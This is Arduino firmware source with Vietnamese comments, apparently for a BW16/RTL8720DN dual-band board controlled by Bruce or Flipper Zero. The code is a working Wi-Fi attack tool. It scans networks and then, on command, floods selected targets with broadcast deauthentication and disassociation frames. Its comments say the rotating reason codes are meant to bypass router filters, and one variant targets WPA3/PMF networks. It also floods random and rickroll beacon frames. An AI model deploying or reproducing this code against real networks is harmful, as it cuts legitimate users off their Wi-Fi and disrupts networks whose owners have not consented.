/*
 * =========================================================================
 *  BW16 / RTL8720DN DUAL-BAND (2.4GHz + 5GHz) FIRMWARE FOR BRUCE & FLIPPER
 * =========================================================================
 * 
 *  SƠ ĐỒ NỐI CHÂN VỚI ESP32 (UART CROSS-WIRING):
 *  -------------------------------------------------------------
 *  Khuyên dùng Port 1 (Serial1 - Chân PB1 & PB2) vì không dính log boot ROM:
 *    ESP32 TX (ví dụ GPIO 21, 4, 11...)  --->  BW16 RX1 (Chân PB2 / D5)
 *    ESP32 RX (ví dụ GPIO 22, 5, 12...)  <---  BW16 TX1 (Chân PB1 / D4)
 *    GND                                <---> GND
 *    VCC (3.3V hoặc 5V)                 <---> 3.3V hoặc 5V
 * 
 *  Nếu dùng Port 0 (Serial / Log UART - Chân PA7 & PA8):
 *    ESP32 TX                            --->  BW16 RX0 (Chân PA8 / D1)
 *    ESP32 RX                            <---  BW16 TX0 (Chân PA7 / D0)
 *    GND                                <---> GND
 * 
 *  * LƯU Ý: Hai bo mạch giao tiếp UART bắt buộc chéo chân:
 *    TX của ESP32  ==>  RX của BW16 (PB2)
 *    RX của ESP32  <==  TX của BW16 (PB1)
 * =========================================================================
 */

#include <WiFi.h>
#include "wifi_cust_tx.h" 
#include "wifi_conf.h"
#include "wifi_util.h"

// --- CẤU HÌNH ---
#define MAX_NETWORKS 50       
#define MAX_TARGETS 10 
#define BAUD 115200

// --- LED PINS TRÊN BW16 ---
#define PIN_LED_R 12  
#define PIN_LED_G 10  
#define PIN_LED_B 11  

// --- ENUMS ---
enum LedState { LED_OFF, LED_BLUE_SOLID, LED_GREEN_WAIT };
enum AttackType { ATK_NONE, ATK_DEAUTH, ATK_WPA3, ATK_BEACON_RANDOM, ATK_BEACON_RICKROLL };

LedState currentLedState = LED_OFF;
AttackType currentAttack = ATK_NONE;
unsigned long scanDoneTime = 0;   

struct NetworkInfo {
  char ssid[33];
  uint8_t bssid[6];     
  int channel;
  int rssi;
  int security; 
};

NetworkInfo scanResults[MAX_NETWORKS]; 
int scanCount = 0;                     

int selectedTargets[MAX_TARGETS]; 
int selectedCount = 0;

volatile bool isScanning = false;
volatile bool scanCompleteTrigger = false;
String serialBuffer0 = "";
String serialBuffer1 = "";
static int cachedChannel = -1;

// Rickroll SSIDs
const char* rick_roll[8] = {
  "01 Never gonna give you up",
  "02 Never gonna let you down",
  "03 Never gonna run around",
  "04 and desert you",
  "05 Never gonna make you cry",
  "06 Never gonna say goodbye",
  "07 Never gonna tell a lie",
  "08 and hurt you"
};

const int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
const int totalChannels = 19;

// --- DUAL UART HELPER (Truyền đồng thời cả Port 0 và Port 1) ---
void uartPrint(const String &s) {
  Serial.print(s);
  Serial1.print(s);
}

void uartPrintln(const String &s) {
  Serial.println(s);
  Serial1.println(s);
}

void uartPrintln() {
  Serial.println();
  Serial1.println();
}

// --- LED CONTROL ---
void setLedColor(bool r, bool g, bool b) {
  digitalWrite(PIN_LED_R, r ? HIGH : LOW);
  digitalWrite(PIN_LED_G, g ? HIGH : LOW);
  digitalWrite(PIN_LED_B, b ? HIGH : LOW);
}

void handleLedEffects() {
  unsigned long currentMillis = millis();
  switch (currentLedState) {
    case LED_OFF: 
      setLedColor(0, 0, 0); 
      break;
    case LED_BLUE_SOLID: 
      setLedColor(0, 0, 1); 
      break;
    case LED_GREEN_WAIT: 
      setLedColor(0, 1, 0); 
      if (currentMillis - scanDoneTime > 3000) currentLedState = LED_OFF;
      break;
  }
}

// --- SCAN HANDLER ---
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result == NULL) return RTW_SUCCESS;

  if (scan_result->scan_complete != RTW_TRUE) {
    if (scanCount >= MAX_NETWORKS) return RTW_SUCCESS;
    rtw_scan_result_t *record = &scan_result->ap_details;
    
    // Đảm bảo không ghi đè tràn buffer rtw_ssid_t val[33]
    if (record->SSID.len > 32) record->SSID.len = 32;
    record->SSID.val[record->SSID.len] = 0; 

    NetworkInfo net;
    memset(&net, 0, sizeof(NetworkInfo));
    if (record->SSID.len > 0) {
      for (size_t k = 0; k < record->SSID.len && k < 32; k++) {
        char c = (char)record->SSID.val[k];
        // Lọc ký tự điều khiển có thể làm vỡ parser phân tách tab (\t) của Bruce
        if (c == '\t' || c == '\r' || c == '\n') c = ' ';
        net.ssid[k] = c;
      }
      net.ssid[record->SSID.len] = '\0';
    } else {
      strcpy(net.ssid, "<hidden>");
    }
    net.channel = record->channel;
    net.rssi = record->signal_strength;
    net.security = record->security;
    memcpy(net.bssid, record->BSSID.octet, 6);

    bool exists = false;
    for (int i = 0; i < scanCount; i++) {
      // 1. Kiểm tra trùng địa chỉ MAC (BSSID): cập nhật tín hiệu mạnh hơn
      if (memcmp(scanResults[i].bssid, net.bssid, 6) == 0) {
        exists = true;
        if (net.rssi > scanResults[i].rssi) {
          scanResults[i].rssi = net.rssi;
          scanResults[i].channel = net.channel;
          if (strcmp(scanResults[i].ssid, "<hidden>") == 0 && strcmp(net.ssid, "<hidden>") != 0) {
            strncpy(scanResults[i].ssid, net.ssid, 32);
            scanResults[i].ssid[32] = '\0';
          }
        }
        break;
      }

      // 2. Lọc trùng tên AP (Mesh Wi-Fi / Repeater phát nhiều node cùng tên):
      // Giữ lại node có tín hiệu RSSI mạnh nhất trên mỗi băng tần (2.4GHz hoặc 5GHz)
      if (strcmp(net.ssid, "<hidden>") != 0 && strcmp(scanResults[i].ssid, net.ssid) == 0) {
        bool is5g_new = (net.channel > 14);
        bool is5g_old = (scanResults[i].channel > 14);
        if (is5g_new == is5g_old) {
          exists = true;
          if (net.rssi > scanResults[i].rssi) {
            scanResults[i] = net;
          }
          break;
        }
      }
    }
    if (!exists) {
      scanResults[scanCount] = net;
      scanCount++;
    }
  } else {
    // Driver AmebaD đã quét xong tất cả các kênh 2.4GHz & 5GHz
    scanCompleteTrigger = true;
  }
  return RTW_SUCCESS;
}

String getEncString(int sec) {
  if (sec == RTW_SECURITY_OPEN) return "OPEN";
  if (sec & RTW_SECURITY_WEP_PSK) return "WEP";
#ifdef RTW_SECURITY_WPA3_SAE
  if (sec & RTW_SECURITY_WPA3_SAE) return "WPA3";
#endif
#ifdef RTW_SECURITY_WPA3_AES_PSK
  if (sec & RTW_SECURITY_WPA3_AES_PSK) return "WPA3";
#endif
  if (sec & RTW_SECURITY_WPA2_AES_PSK) return "WPA2";
  if (sec & RTW_SECURITY_WPA_AES_PSK) return "WPA";
  return "UNK";
}

int getDelfySecurity(int sec) {
  if (sec == RTW_SECURITY_OPEN) return 0; // OPEN
  if (sec & RTW_SECURITY_WEP_PSK) return 1; // WEP
#ifdef RTW_SECURITY_WPA3_SAE
  if (sec & RTW_SECURITY_WPA3_SAE) return 5; // WPA3
#endif
#ifdef RTW_SECURITY_WPA3_AES_PSK
  if (sec & RTW_SECURITY_WPA3_AES_PSK) return 5; // WPA3
#endif
  if (sec & RTW_SECURITY_WPA2_AES_PSK) return 3; // WPA2
  if (sec & RTW_SECURITY_WPA_AES_PSK) return 2;  // WPA
  return 3; // Mặc định WPA2
}

void flushUartBuffers() {
  while (Serial.available()) Serial.read();
  while (Serial1.available()) Serial1.read();
  serialBuffer0 = "";
  serialBuffer1 = "";
}

void stopAttack() {
  currentAttack = ATK_NONE;
  currentLedState = LED_OFF;
  setLedColor(0, 0, 0);
  cachedChannel = -1;
  isScanning = false;
  wifi_set_channel(1);
}

void printScanResults();

void startScan() {
  if (isScanning) return;
  stopAttack();
  scanCount = 0; 
  selectedCount = 0; 
  isScanning = true;
  scanCompleteTrigger = false;
  
  setLedColor(0, 0, 1); // LED xanh dương khi khởi động scan
  delay(50);

  int ret = wifi_scan_networks(scanResultHandler, NULL);
  if (ret != RTW_SUCCESS) {
    for (int r = 0; r < 3; r++) {
      delay(100);
      ret = wifi_scan_networks(scanResultHandler, NULL);
      if (ret == RTW_SUCCESS) break;
    }
  }

  // Khôi phục lại driver Wi-Fi nếu bị kẹt sau quá trình raw packet injection
  if (ret != RTW_SUCCESS) {
    wifi_off();
    delay(150);
    wifi_on(RTW_MODE_STA);
    delay(200);
    ret = wifi_scan_networks(scanResultHandler, NULL);
  }

  if (ret == RTW_SUCCESS) {
    uartPrintln("[SCAN STARTED...]");
    unsigned long scanStartMs = millis();
    unsigned long lastHbMs = millis();
    int ledStep = 0;

    // Chờ không đồng bộ theo tín hiệu hoàn tất thực tế từ AmebaD driver (tối đa 7000ms timeout)
    while (!scanCompleteTrigger && (millis() - scanStartMs < 7000)) {
      delay(50);
      ledStep++;
      if (ledStep % 4 == 0) {
        setLedColor(0, ((ledStep / 4) % 2 == 0) ? 1 : 0, 0); // Nhấp nháy LED xanh lá cây
      }
      if (millis() - lastHbMs >= 1000) {
        lastHbMs = millis();
        uartPrintln("sci"); // Heartbeat gửi định kỳ mỗi giây để Bruce không timeout
      }
      taskYIELD();
    }
    
    isScanning = false;
    scanDoneTime = millis();
    uartPrintln(""); 
    uartPrintln("SCAN:OK");
    printScanResults();
    currentLedState = LED_GREEN_WAIT; 
  } else {
    isScanning = false;
    currentLedState = LED_OFF;
    setLedColor(0, 0, 0);
    uartPrintln("[SCAN FAILED: Driver Busy]");
  }
}

void setup() {
  delay(1000); // Đệm an toàn 1s: Ổn định nguồn và nhường kết nối cho bootloader/ISP flasher khi nạp

  // 1. Mở Port 0 (PA7 TX / PA8 RX)
  Serial.begin(BAUD);

  // 2. Mở Port 1 (PB1 TX / PB2 RX) - Khuyên dùng nối ESP32 vì sạch log boot
  Serial1.begin(BAUD);

  pinMode(PIN_LED_R, OUTPUT); 
  pinMode(PIN_LED_G, OUTPUT); 
  pinMode(PIN_LED_B, OUTPUT);
  setLedColor(0, 0, 0);

  // Khởi động Wi-Fi chuẩn STA cho RTL8720DN (AmebaD 3.1.5)
  wifi_on(RTW_MODE_STA);
  
  uartPrintln("\n[BW16 MULTI-TARGET READY]");
  uartPrintln("[UART: Serial0 (PA7/PA8) & Serial1 (PB1/PB2) ACTIVE]");
}

// --- ATTACK LOGIC ---
void setTargetChannel(int ch) {
  if (ch <= 0 || ch > 165) return;
  if (cachedChannel != ch) {
    // Phát hiện chuyển băng tần: 2.4GHz (ch ≤ 14) ↔ 5GHz (ch > 14)
    bool crossBand = (cachedChannel > 0) && ((cachedChannel <= 14) != (ch <= 14));
    wifi_set_channel(ch);
    cachedChannel = ch;
    if (crossBand) {
      delay(50); // PLL cần thời gian dài hơn khi đổi giữa 2.4GHz và 5GHz
    } else {
      delay(10); // Cùng băng tần: 10ms đủ cho PLL lock
    }
  }
}

void atkDeauth() {
  static unsigned long lastBurstTime = 0;
  static int currentTargetIdx = 0;
  static unsigned long lastLogTime = 0;
  static uint32_t packetCount = 0;
  
  // Throttle bằng millis(): 80ms giữa các đợt → ~12 burst/giây
  // Đủ nhanh để hiệu quả, đủ chậm để DMA buffer kịp giải phóng
  unsigned long now = millis();
  if (now - lastBurstTime < 80) return;
  lastBurstTime = now;
  
  if (selectedCount == 0) return;
  if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
  
  int targetID = selectedTargets[currentTargetIdx];
  currentTargetIdx++;
  if (targetID < 0 || targetID >= scanCount) return;
  
  NetworkInfo target = scanResults[targetID];
  setTargetChannel(target.channel);

  // Xoay vòng 5 reason code khác nhau để bypass filter trên một số router
  static const uint16_t reasons[] = {1, 2, 4, 6, 7};
  uint16_t reason = reasons[(packetCount / 3) % 5];

  digitalWrite(PIN_LED_R, HIGH);
  
  // Gửi 3 frame mỗi burst: Deauth + Disassoc + Deauth (reason khác)
  // Gửi CẢ deauth + disassoc gấp đôi hiệu quả (một số thiết bị chỉ phản hồi 1 loại)
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
  delay(1);
  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
  delay(1);
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", (reason == 7) ? 1 : reason + 1);
  
  digitalWrite(PIN_LED_R, LOW);
  packetCount += 3;

  // Log tiến trình mỗi 2 giây + số lỗi TX để debug
  if (now - lastLogTime > 2000) {
    lastLogTime = now;
    String log = "[DEAUTH] Pkts:" + String(packetCount) + " CH:" + String(target.channel) + " " + String(target.ssid);
    if (tx_fail_count > 0) log += " TxErr:" + String(tx_fail_count);
    uartPrintln(log);
  }
}

void atkWpa3() {
  static unsigned long lastBurstTime = 0;
  static int currentTargetIdx = 0;
  static unsigned long lastLogTime = 0;
  static uint32_t packetCount = 0;
  
  unsigned long now = millis();
  if (now - lastBurstTime < 80) return;
  lastBurstTime = now;
  
  if (selectedCount == 0) return;
  if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
  
  int targetID = selectedTargets[currentTargetIdx];
  currentTargetIdx++;
  if (targetID < 0 || targetID >= scanCount) return;
  
  NetworkInfo target = scanResults[targetID];
  setTargetChannel(target.channel);

  // Reason codes hiệu quả với PMF/WPA3: 6 (Class 2), 7 (Class 3), 23 (IEEE 802.11w)
  static const uint16_t reasons[] = {6, 7, 23, 24, 39};
  uint16_t reason = reasons[(packetCount / 3) % 5];

  digitalWrite(PIN_LED_R, HIGH);
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
  delay(1);
  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
  delay(1);
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);
  digitalWrite(PIN_LED_R, LOW);
  packetCount += 3;

  if (now - lastLogTime > 2000) {
    lastLogTime = now;
    String log = "[WPA3] Pkts:" + String(packetCount) + " CH:" + String(target.channel) + " " + String(target.ssid);
    if (tx_fail_count > 0) log += " TxErr:" + String(tx_fail_count);
    uartPrintln(log);
  }
}

void atkBeaconRandom() {
  static unsigned long lastBurstTime = 0;
  unsigned long now = millis();
  if (now - lastBurstTime < 50) return;
  lastBurstTime = now;

  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  char rand_ssid[17];
  int len = random(6, 15);
  for (int i = 0; i < len; i++) {
    rand_ssid[i] = charset[random(0, sizeof(charset) - 1)];
  }
  rand_ssid[len] = '\0';

  uint8_t rand_bssid[6];
  rand_bssid[0] = 0x02; // Locally administered
  for (int i = 1; i < 6; i++) rand_bssid[i] = (uint8_t)random(0, 256);

  int ch = allChannels[random(0, totalChannels)];
  setTargetChannel(ch);

  digitalWrite(PIN_LED_R, HIGH);
  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
  delay(1);
  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
  digitalWrite(PIN_LED_R, LOW);
}

void atkBeaconRickroll() {
  static unsigned long lastBurstTime = 0;
  unsigned long now = millis();
  if (now - lastBurstTime < 50) return;
  lastBurstTime = now;

  static int songIdx = 0;
  uint8_t rand_bssid[6];
  rand_bssid[0] = 0x02;
  rand_bssid[1] = 0x16;
  rand_bssid[2] = 0x88;
  for (int i = 3; i < 6; i++) rand_bssid[i] = (uint8_t)random(0, 256);

  int ch = (songIdx % 11) + 1;
  setTargetChannel(ch);

  digitalWrite(PIN_LED_R, HIGH);
  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rick_roll[songIdx]);
  songIdx = (songIdx + 1) % 8;
  digitalWrite(PIN_LED_R, LOW);
}

void handleAttack() {
  if (currentAttack == ATK_DEAUTH) atkDeauth();
  else if (currentAttack == ATK_WPA3) atkWpa3();
  else if (currentAttack == ATK_BEACON_RANDOM) atkBeaconRandom();
  else if (currentAttack == ATK_BEACON_RICKROLL) atkBeaconRickroll();
}

void printScanResults() {
  uartPrintln("--- SCAN RESULTS ---");
  for (int i = 0; i < scanCount; i++) {
    String line = "[" + String(i) + "]\t" +
                  String(scanResults[i].channel) + "\t" +
                  String(scanResults[i].rssi) + "\t" +
                  getEncString(scanResults[i].security) + "\t" +
                  String(scanResults[i].ssid);
    uartPrintln(line);
  }
  uartPrintln("--------------------");
}

void printRtlScanList() {
  for (int i = 0; i < scanCount; i++) {
    String line = "AP:" + String(i) + "|" + String(scanResults[i].ssid) + "|";
    for (int j = 0; j < 6; j++) {
      if (j > 0) line += ":";
      if (scanResults[i].bssid[j] < 0x10) line += "0";
      line += String(scanResults[i].bssid[j], HEX);
    }
    line += "|" + String(scanResults[i].channel) + "|" +
            String(getDelfySecurity(scanResults[i].security)) + "|" +
            String(scanResults[i].rssi);
    uartPrintln(line);
  }
}

// --- COMMAND PARSER (Tương thích cả Bruce OS lẫn Flipper Zero / RTL8720) ---
void processCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  // 1. Lệnh quét mạng (Bruce "sc" hoặc Flipper "SCAN")
  if (cmd == "sc" || cmd.startsWith("SCAN")) {
    if (isScanning) return;
    // Chống quét trùng lặp khi Bruce gửi đồng thời cả "SCAN" và "sc" liên tiếp
    if (millis() - scanDoneTime < 4000 && scanCount > 0) {
      uartPrintln("SCAN:OK");
      if (cmd == "sc") printScanResults();
      else printRtlScanList();
      return;
    }
    startScan();
  }
  // 2. Lệnh chọn mục tiêu Bruce ("sl:1,2,3" hoặc "sl:0")
  else if (cmd.startsWith("sl:")) {
    stopAttack();
    selectedCount = 0; 
    
    String nums = cmd.substring(3);
    char buf[64];
    strncpy(buf, nums.c_str(), sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    char *token = strtok(buf, ",");
    while (token != NULL && selectedCount < MAX_TARGETS) {
      int id = atoi(token);
      int idx = -1;
      // Chuẩn 0-based: 0 đến scanCount - 1 (Khớp hoàn toàn với AP:ID và [ID])
      if (id >= 0 && id < scanCount) {
        idx = id;
      } else if (id == scanCount && scanCount > 0) {
        // Dự phòng tương thích ngược 1-based (1 đến scanCount)
        idx = scanCount - 1;
      }
      
      if (idx >= 0 && idx < scanCount) {
        selectedTargets[selectedCount] = idx; 
        selectedCount++;
      }
      token = strtok(NULL, ",");
    }
    
    if (selectedCount > 0) {
      currentLedState = LED_BLUE_SOLID;
      uartPrintln("[SELECTED " + String(selectedCount) + " TARGETS]");
    }
  }
  // 3. Lệnh chọn mục tiêu Flipper / Bruce ("DEAUTH 1", "DEAUTH:0" hoặc "DEAUTH ALL")
  else if (cmd.startsWith("DEAUTH")) {
    String targetStr = "";
    if (cmd.startsWith("DEAUTH:")) targetStr = cmd.substring(7);
    else if (cmd.startsWith("DEAUTH ")) targetStr = cmd.substring(7);
    targetStr.trim();

    if (targetStr == "ALL" || targetStr == "") {
      if (selectedCount == 0) {
        for (int i = 0; i < scanCount && i < MAX_TARGETS; i++) {
          selectedTargets[selectedCount++] = i;
        }
      }
    } else {
      int id = targetStr.toInt();
      int idx = -1;
      if (id >= 0 && id < scanCount) {
        idx = id;
      } else if (id == scanCount && scanCount > 0) {
        idx = scanCount - 1;
      }
      if (idx >= 0 && idx < scanCount) {
        selectedTargets[0] = idx;
        selectedCount = 1;
      }
    }

    if (selectedCount > 0) {
      if (currentAttack != ATK_DEAUTH) {
        currentAttack = ATK_DEAUTH;
        cachedChannel = -1;
        uartPrintln("[ATTACK STARTED: DEAUTH]");
      }
    }
  }
  // 4. Lệnh tấn công từ Bruce ("atk:...")
  else if (cmd.startsWith("atk:")) {
    String type = cmd.substring(4);
    type.trim();

    if (type == "deauth" || type == "flood") { 
      if (selectedCount == 0 && scanCount > 0) {
        for (int i = 0; i < scanCount && i < MAX_TARGETS; i++) {
          selectedTargets[selectedCount++] = i;
        }
      }
      if (selectedCount > 0) {
        if (currentAttack != ATK_DEAUTH) {
          currentAttack = ATK_DEAUTH; 
          cachedChannel = -1;
          uartPrintln("[ATTACK STARTED: DEAUTH]");
        }
      } else {
        uartPrintln("[ERROR: No target selected. Use sl:id]");
      }
    } 
    else if (type == "wpa3") {
      if (selectedCount == 0 && scanCount > 0) {
        for (int i = 0; i < scanCount && i < MAX_TARGETS; i++) {
          selectedTargets[selectedCount++] = i;
        }
      }
      if (selectedCount > 0) {
        if (currentAttack != ATK_WPA3) {
          currentAttack = ATK_WPA3;
          cachedChannel = -1;
          uartPrintln("[ATTACK STARTED: WPA3]");
        }
      }
    }
    else if (type == "beacon" || type == "random") {
      currentAttack = ATK_BEACON_RANDOM;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
    }
    else if (type == "rickroll") {
      currentAttack = ATK_BEACON_RICKROLL;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
    }
  }
  // 5. Lệnh Beacon từ RTL8720 / Flipper
  else if (cmd.startsWith("RANDOM") || cmd.startsWith("BEACON:RANDOM")) {
    currentAttack = ATK_BEACON_RANDOM;
    cachedChannel = -1;
    uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
  }
  else if (cmd.startsWith("RICKROLL") || cmd.startsWith("BEACON:RICKROLL")) {
    currentAttack = ATK_BEACON_RICKROLL;
    cachedChannel = -1;
    uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
  }
  // 6. Kiểm tra kết nối (PING -> PONG)
  else if (cmd.startsWith("PING")) {
    uartPrintln("PONG");
  }
  // 7. Lấy danh sách kiểu RTL8720
  else if (cmd.startsWith("LIST")) {
    printRtlScanList();
  }
  // 8. Dừng tấn công (Bruce "stop", "st" hoặc Flipper "STOP")
  else if (cmd == "stop" || cmd == "st" || cmd.startsWith("STOP")) {
    stopAttack();
    uartPrintln("[STOPPED]");
  }
}

void loop() {
  // Đọc từ Serial (Port 0: PA7/PA8)
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') { 
      if (serialBuffer0.length() > 0) {
        processCommand(serialBuffer0); 
        serialBuffer0 = ""; 
      }
    } 
    else { 
      serialBuffer0 += c; 
      if (serialBuffer0.length() > 256) serialBuffer0 = ""; // Chống cạn kiệt FreeRTOS heap
    }
  }

  // Đọc từ Serial1 (Port 1: PB1/PB2 - khuyên dùng nối ESP32)
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    if (c == '\n' || c == '\r') { 
      if (serialBuffer1.length() > 0) {
        processCommand(serialBuffer1); 
        serialBuffer1 = ""; 
      }
    } 
    else { 
      serialBuffer1 += c; 
      if (serialBuffer1.length() > 256) serialBuffer1 = ""; // Chống cạn kiệt FreeRTOS heap
    }
  }

  if (currentAttack != ATK_NONE) {
    handleAttack();
  } else {
    handleLedEffects();
  }

  delay(2); // Nhường CPU cho FreeRTOS scheduler & Wi-Fi DMA
}